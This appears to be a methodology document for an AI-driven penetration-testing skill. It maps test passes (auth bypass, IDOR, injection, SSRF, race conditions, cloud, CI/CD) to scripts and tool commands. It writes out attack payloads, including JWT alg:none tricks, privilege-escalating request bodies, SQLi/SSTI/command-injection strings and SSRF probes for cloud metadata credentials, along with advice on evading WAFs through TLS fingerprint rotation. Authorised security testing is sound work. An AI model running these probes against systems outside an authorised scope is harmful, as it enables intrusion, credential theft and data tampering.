# Methodology — what Kage tests, how, when

Read this in Turn 2. For each pass, decide "run" / "skip" based on the
trigger, invoke the bundled script (or tool), and record evidence.

All probe scripts live at `$SKILL_DIR/scripts/` and are invoked through the
shim. The shim resolves them automatically — just use the command names
below. Workspace paths are relative to `$PWD`, which is bind-mounted to
`/workspace` inside the sandbox.

## Script conventions

- Every script accepts `--output <path>` and writes structured JSON there.
- Every script's JSON has a top-level `findings[]` and `summary{}` shape.
- All HTTP goes through `tls.py` (curl_cffi with browser TLS
  fingerprint rotation — chrome124, chrome131, safari17_0, firefox133).
- Default request timeout is 10–15s. Rate-limit/WAF behaviour: rotate
  fingerprint via `--impersonate`, or slow down.

---

## Authentication bypass

**Trigger:** login page, SSO endpoint, OAuth redirect, JWT in any traffic

**Script:** [`authbypass.py`](../scripts/authbypass.py)

Tests, in order: no-auth, empty Bearer, null token, `X-Forwarded-For: 127.0.0.1`,
`X-Real-IP: 127.0.0.1`, `X-Internal-Request: true`, `X-Custom-IP-Authorization`,
`X-HTTP-Method-Override` with method swap, content-type trick. If the provided
token is a JWT, adds `alg:none` + empty-signature variants (real base64 manipulation).

```bash
"$K" python3 "$SKILL_DIR/scripts/authbypass.py" \
  --url "https://target/api/admin" \
  --valid-token "Bearer $ADMIN_JWT" \
  --output testing/auth/auth.json
```

**Verdict logic:** bypass flagged when a test returns the same status +
length (±100 bytes) as the baseline, OR flips a 4xx baseline into 2xx/3xx.

Session fixation, OAuth state param, redirect_uri bypass, and MFA
step-skipping are currently manual — test with `tls.py` ad-hoc.

---

## Authorization / IDOR / BOLA

**Trigger:** API endpoint with object IDs (`/users/<id>`, `/orders/<id>`)
AND ≥2 accounts from `creds.md`

**Script:** [`idor.py`](../scripts/idor.py)

Runs three requests per method:
1. Victim token → victim resource (baseline)
2. Attacker token → victim resource (the attack)
3. Attacker token → attacker resource (control)

Flags `VULNERABLE` when attack returns 2xx/3xx, response body overlaps
baseline by >50% word-set similarity, and differs from the attacker's own
resource.

```bash
"$K" python3 "$SKILL_DIR/scripts/idor.py" \
  --url "https://target/api/invoices/{id}" \
  --attacker-token "$A_TOK" --victim-token "$B_TOK" \
  --attacker-id 101 --victim-id 201 \
  --methods GET,PUT,DELETE \
  --output testing/idor/invoices.json
```

**Variants to test separately** (same script, different URL):
- IDs in query string (`?id={id}`), body, headers (`X-User-Id: {id}`)
- UUIDs — predictable? sequential? leaked in any endpoint?

## Mass-assignment

**Trigger:** any endpoint that accepts JSON bodies on PUT/PATCH/POST and
at least one writable field that mirrors into a `GET` response.

No canned script for this — the blind-fuzz approach (POST with extra
fields and look for HTTP 200) has too many false positives to be useful.
Real mass-assignment testing needs target-aware work:

1. GET the endpoint to see what fields currently exist on the object.
2. Pick 3–5 privilege-adjacent candidates that aren't already present
   (`role`, `is_admin`, `is_staff`, `email_verified`, `plan`, `balance`).
3. PUT with each candidate added, with values that are distinct enough
   to spot in a subsequent GET (e.g. `"role": "superadmin"`, `"balance": 999999`).
4. GET again and diff. Only a field that actually mutates on the GET is
   a real finding.

Drive with `tls.py` one-liners:

```bash
# Baseline
"$K" python3 "$SKILL_DIR/scripts/tls.py" GET "https://target/api/users/me" \
  --token "Bearer $JWT" > testing/mass-assign/before.json

# Attempt
"$K" python3 "$SKILL_DIR/scripts/tls.py" PUT "https://target/api/users/me" \
  --token "Bearer $JWT" \
  --data '{"role":"superadmin","is_admin":true}'

# Verify
"$K" python3 "$SKILL_DIR/scripts/tls.py" GET "https://target/api/users/me" \
  --token "Bearer $JWT" > testing/mass-assign/after.json

# Diff
"$K" python3 "$SKILL_DIR/scripts/diff.py" \
  --url-a "https://target/api/users/me" --headers-a "Authorization: Bearer $JWT" \
  --url-b "https://target/api/users/me" --headers-b "Authorization: Bearer $JWT" \
  --output testing/mass-assign/diff.json
```

---

## Access control / privilege escalation

**Trigger:** 403 responses, admin panels, role-gated paths discovered in recon

**Script:** [`diff.py`](../scripts/diff.py)

Sends two requests with different auth and compares status, length, body
via `difflib.SequenceMatcher` + word-overlap.

```bash
"$K" python3 "$SKILL_DIR/scripts/diff.py" \
  --url-a "https://target/admin/users/1" --headers-a "Authorization: Bearer $USER_TOK" \
  --url-b "https://target/admin/users/1" --headers-b "Authorization: Bearer $ADMIN_TOK" \
  --output testing/access-control/admin-users-1.json
```

`SAME_RESPONSE` with >80% similarity when the lower-priv token should have
gotten a 403 = broken access control.

**Forwarded-header escalation** (no dedicated script — use `authbypass.py`
or inline): `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`,
`X-Rewrite-URL: /admin`.

---

## Injection

### SQL injection (Kali tool)

```bash
"$K" sqlmap -u "https://target/search?q=test" \
  --batch --level 3 --risk 2 \
  --tamper=between,space2comment \
  --output-dir testing/sqli/
```

### XSS (Kali tools)

```bash
"$K" dalfox url "https://target/search?q=FUZZ" -o testing/xss/dalfox.txt
"$K" nuclei -u "https://target" -t vulnerabilities/xss/ -o testing/xss/nuclei.txt
```

### Command / template / NoSQL / LDAP

Manual probes. Canonical payloads:

- **Command injection**: `; id`, `| whoami`, `` `id` ``, `$(id)`, CRLF.
- **SSTI**: `{{7*7}}` → 49 (Jinja/Twig). `${7*7}` (FreeMarker). `<%= 7*7 %>` (ERB).
- **NoSQL**: `{"$ne": null}`, `{"$gt": ""}`, `{"$where": "1==1"}` as JSON bodies.
- **LDAP**: `*)(uid=*`, `*)(|(uid=*`.

Drive with a `tls.py` one-liner; nothing to automate beyond that.

---

## SSRF

**Trigger:** any parameter taking a URL (`url=`, `redirect=`, `proxy=`,
`image=`, `callback=`, `fetch=`, `webhook=`)

**Script:** [`ssrf.py`](../scripts/ssrf.py)

Tries AWS IMDSv1 (metadata + role creds), localhost via decimal / hex /
short / IPv6 / nip.io rebind, Redis/ES internal services, `file:///etc/passwd`.
Response-body indicators (`ami-id`, `root:x:0:0`, `redis_version`, …)
confirm hits.

```bash
# Start OOB listener first (optional, for blind SSRF)
"$K" interactsh-client -v &
CB="https://abc123.interactsh.sh"

"$K" python3 "$SKILL_DIR/scripts/ssrf.py" \
  --url "https://target/fetch?url={payload}" \
  --callback "$CB" \
  --token "Bearer $JWT" \
  --output testing/ssrf/fetch.json
```

Severity: `CRITICAL` when IMDS credentials are returned, `HIGH` for
`/etc/passwd` or any internal service with content, `MEDIUM` for internal
port reachability without content.

---

## CORS / security headers / cache poisoning

**Trigger:** any web host

**Scripts:**
- [`cors.py`](../scripts/cors.py) — focused CORS check
- [`headers.py`](../scripts/headers.py) — full pass (CORS + CRLF + host header + cache + missing headers)

```bash
"$K" python3 "$SKILL_DIR/scripts/cors.py" \
  --url "https://target/api/me" --token "Bearer $JWT" \
  --output testing/cors/api-me.json

"$K" python3 "$SKILL_DIR/scripts/headers.py" \
  --url "https://target" \
  --output testing/headers/audit.json
```

`HIGH` severity: reflected arbitrary origin with `Access-Control-Allow-Credentials: true`,
null-origin accepted with credentials, CRLF header injection, cache
poisoning via unkeyed `X-Forwarded-Host`.

---

## Race conditions

**Trigger:** auth, payment, coupon, invitation, rate-limited action,
multi-step workflow

**Script:** [`race.py`](../scripts/race.py)

Uses `threading.Barrier` so N threads fire simultaneously (not staggered).
Reports success count, time spread in ms, and verdict.

```bash
"$K" python3 "$SKILL_DIR/scripts/race.py" \
  --url "https://target/api/redeem" \
  --method POST \
  --token "Bearer $JWT" \
  --data '{"code":"PROMO"}' \
  --parallel 20 \
  --output testing/race/redeem.json
```

`VULNERABLE` when >1 out of N parallel requests succeed (with <50ms time
spread). `HIGH` severity when >3 succeed, otherwise `MEDIUM`.

---

## API enumeration (REST + GraphQL)

**REST — hidden parameter discovery:**

```bash
"$K" ffuf -u "https://target/api/users/me?FUZZ=x" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all -fc 404 -o testing/api/params.json -of json
```

Verb tampering: manually try `PUT /api/users/me` with foreign fields, test
pagination abuse with negative `offset` and very large `limit`.

**GraphQL:**

```bash
# Introspection open?
"$K" python3 "$SKILL_DIR/scripts/tls.py" POST "https://target/graphql" \
  --data '{"query":"{ __schema { types { name } } }"}' \
  --token "Bearer $JWT"
```

Deep queries → DoS. Alias abuse → rate-limit bypass. Batched queries →
auth check only on the first query.

---

## Infrastructure / CDN / cache

**Trigger:** CDN signatures (`cf-ray`, `x-cache`, `x-served-by`, `age`)

Covered by `headers.py` (cache poisoning + unkeyed-header reflection).

**HTTP request smuggling** (CL.TE, TE.CL, CL.CL): no packaged tool in the
sandbox — manual probes via `tls.py` with raw `Content-Length` and
`Transfer-Encoding` headers. Severity is high but the tooling story is
manual for now.

**Origin IP exposure:** run `dnsx` on the subdomain list plus historic A
records from SecurityTrails / Censys (outside the sandbox unless you bring
an API key).

---

## OSINT / footprinting

**Script:** [`dorks.py`](../scripts/dorks.py)

Generates 100+ Google dorks across 10 categories (credentials, PII, admin
panels, errors, cloud buckets, subdomains, juicy URL params, leaks on
Pastebin/GitHub/Notion, GitHub code search, backup files). Writes a
clickable HTML report, JSON, and plaintext.

```bash
"$K" python3 "$SKILL_DIR/scripts/dorks.py" \
  -d target.com -c all \
  -o recon/dorks.txt --html recon/dorks.html
```

Doesn't send traffic — it's a dork-generator. Open the HTML in a host
browser; Google will ask you to solve captchas if you query them at speed.

---

## Cloud

**Trigger:** AWS/GCP/Azure signatures (`.s3.amazonaws.com`,
`.cloudfunctions.net`, `.azurewebsites.net`), metadata endpoint references
in code

**Tools (Kali bundled):**

```bash
"$K" nuclei -u "$TARGET_URL" -t cloud/ -t misconfiguration/ \
  -o testing/cloud/nuclei.txt

"$K" trufflehog filesystem /workspace/target-repo --only-verified
```

Bucket checks: public listing, public read, writable. S3 bucket takeover
(`NoSuchBucket` on a claimed subdomain → register the bucket with the same
name).

AWS SSRF → IMDSv1 creds is already covered by `ssrf.py` when the
target accepts URL params.

---

## CI/CD / supply chain

**Trigger:** public GitHub repos referenced in scope

```bash
"$K" gitleaks detect --source /workspace/target-repo \
  -r testing/secrets/gitleaks.json --report-format json

"$K" trufflehog filesystem /workspace/target-repo --only-verified \
  > testing/secrets/trufflehog.txt
```

GitHub Actions workflow injection: grep the repo for `pull_request_target`
+ `${{ github.event.* }}` in shell steps. Self-hosted runners that accept
fork PRs are high-impact.

---

## White-box (source code audit)

**Trigger:** `source` scope (user pointed at a local path)

**Baseline sweep:**

```bash
"$K" semgrep --config=auto /workspace/src -o testing/sast/semgrep.json --json
"$K" bandit -r /workspace/src -f json -o testing/sast/bandit.json
"$K" gitleaks detect --source /workspace/src -r testing/sast/gitleaks.json -f json
"$K" trufflehog filesystem /workspace/src --only-verified \
  > testing/sast/trufflehog.txt
```

**Manual follow-up (the high-signal work):**

- Trust boundaries — where does untrusted input enter? Where is it validated?
- Auth middleware — every privileged handler gated?
- Raw SQL / shell exec / deserialization from user input
- Crypto — home-rolled primitives, ECB mode, hardcoded IVs, weak KDFs,
  non-constant-time comparisons on secrets

---

## Summary — what's shipped vs what's manual

| Pass | Shipped script | Kali tool | Manual |
|---|---|---|---|
| Auth bypass | `authbypass.py` | — | session fixation, OAuth, JWT HS256 cracking |
| IDOR / BOLA | `idor.py` | — | header/body ID placement |
| Mass-assign | — | — | target-aware GET → PUT → GET diff |
| Access control | `diff.py` | — | forwarded headers |
| SQL injection | — | `sqlmap` | NoSQL, LDAP |
| XSS | — | `dalfox`, `nuclei` | — |
| SSRF | `ssrf.py` + `interactsh-client` | — | DNS rebind |
| CORS / headers / cache | `cors.py`, `headers.py` | — | request smuggling |
| Race conditions | `race.py` | — | — |
| API params | — | `ffuf` | verb tampering |
| OSINT dorking | `dorks.py` | — | — |
| Cloud | — | `nuclei cloud/`, `trufflehog` | bucket takeover |
| CI/CD | — | `gitleaks`, `trufflehog` | GHA workflow review |
| White-box SAST | — | `semgrep`, `bandit` | trust-boundary review |

Anything in the "manual" column is a candidate for future scripts.
